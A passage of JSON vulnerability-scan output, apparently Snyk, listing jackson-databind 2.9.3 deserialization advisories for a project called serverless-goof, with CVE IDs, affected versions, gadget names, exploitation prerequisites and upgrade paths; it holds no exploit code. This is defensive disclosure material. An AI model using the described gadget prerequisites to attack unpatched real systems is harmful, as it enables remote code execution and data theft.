      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It may allow content exfiltration (remote access by sending contents over ftp) when untrusted content is deserialized with default typing enabled. This vulnerability is due to an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-11307`) is not identical to `CVE-2018-12018`,`CVE-2018-12019`, `CVE-2018-14720`, `CVE-2018-14721`, `CVE-2018-14722` and `CVE-2018-14723`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.4, 2.8.11.2, 2.9.5 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/27b4defc270454dea6842bd9279f17387eceb737)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2032)\n",
      "disclosureTime": "2018-05-10T17:10:58Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.7.9.4)",
            "[2.8.0, 2.8.11.2)",
            "[2.9.0, 2.9.6)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.4",
        "2.8.11.2",
        "2.9.5"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72446",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-qr7j-h6gg-jmgc"
        ],
        "CVE": [
          "CVE-2018-11307"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-04-28T12:11:41.740420Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:10:50Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/27b4defc270454dea6842bd9279f17387eceb737"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2032"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.7.9.4)",
            "[2.8.0, 2.8.11.2)",
            "[2.9.0, 2.9.6)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.4)",
          "[2.8.0,2.8.11.2)",
          "[2.9.0,2.9.5)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.5"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:16:09.944095Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attack, if the user is handling untrusted content or using the `Default Typing` feature. This vulnerability is due to an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-12023`) is not identical to `CVE-2018-12018`, `CVE-2018-12019`, `CVE-2018-14720`, `CVE-2018-14721`, `CVE-2018-14722` and `CVE-2018-11307`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.4, 2.8.11.2, 2.9.6 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/28badf7ef60ac3e7ef151cd8e8ec010b8479226a)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2058)\n",
      "disclosureTime": "2018-05-29T17:15:50Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.7.9.4)",
            "[2.8.0,2.8.11.2)",
            "[2.9.0,2.9.6)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.4",
        "2.8.11.2",
        "2.9.6"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72447",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-6wqp-v4v6-c87c"
        ],
        "CVE": [
          "CVE-2018-12023"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-11-15T16:06:01.747120Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:15:49Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/28badf7ef60ac3e7ef151cd8e8ec010b8479226a"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2058"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.7.9.4)",
            "[2.8.0,2.8.11.2)",
            "[2.9.0,2.9.6)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.4)",
          "[2.8.0,2.8.11.2)",
          "[2.9.0,2.9.6)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.6"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:21:07.540945Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attacks via the ` slf4j-ext` gadget due to an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-14718`) is not identical to `CVE-2018-12019`, `CVE-2018-14720`, `CVE-2018-14721`, `CVE-2018-14722`,`CVE-2018-12023` and `CVE-2018-11307`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.7 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2097)\n",
      "disclosureTime": "2018-07-27T17:19:49Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.7"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72448",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-645p-88qh-w398"
        ],
        "CVE": [
          "CVE-2018-14718"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-07-06T14:09:20.824044Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:19:41Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2097"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.7)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:21:22.141403Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform an XML External Entity (XXE) Injection via the `JDK` classes due to an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-14720`) is not identical to `CVE-2018-12018`, `CVE-2018-14729`, `CVE-2018-14721`, `CVE-2018-14722`,`CVE-2018-12023` and `CVE-2018-11307`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.7 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2097)\n",
      "disclosureTime": "2018-07-27T17:20:17Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.7"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72449",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-x2w5-5m2g-7h5m"
        ],
        "CVE": [
          "CVE-2018-14720"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-07-06T14:09:09.489795Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:19:17Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2097"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.7)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:23:45.326350Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attack via the `blaze-ds-opt` gadget due to an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-14719`) is not identical to `CVE-2018-12018`, `CVE-2018-14720`, `CVE-2018-14721`, `CVE-2018-14722`,`CVE-2018-12023` and `CVE-2018-11307`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.7 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2097)\n- [GitHub Release Notes](https://github.com/FasterXML/jackson-databind/blob/a066415d66a6b1a4688ff0ed25695aa3a86ac130/release-notes/VERSION-2.x)\n",
      "disclosureTime": "2018-07-27T17:22:45Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.7"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72450",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-4gq5-ch57-c2mg"
        ],
        "CVE": [
          "CVE-2018-14719"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-07-06T14:09:21.062185Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:22:38Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2097"
        },
        {
          "title": "GitHub Release Notes",
          "url": "https://github.com/FasterXML/jackson-databind/blob/a066415d66a6b1a4688ff0ed25695aa3a86ac130/release-notes/VERSION-2.x"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.7)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:25:40.161831Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A malicious user could perform a SSRF attack via the `axis2-jaxws` gadget due to an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-14721`) is not identical to `CVE-2018-12018`, `CVE-2018-14719`, `CVE-2018-14720`, `CVE-2018-14722`,`CVE-2018-12023` and `CVE-2018-11307`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on 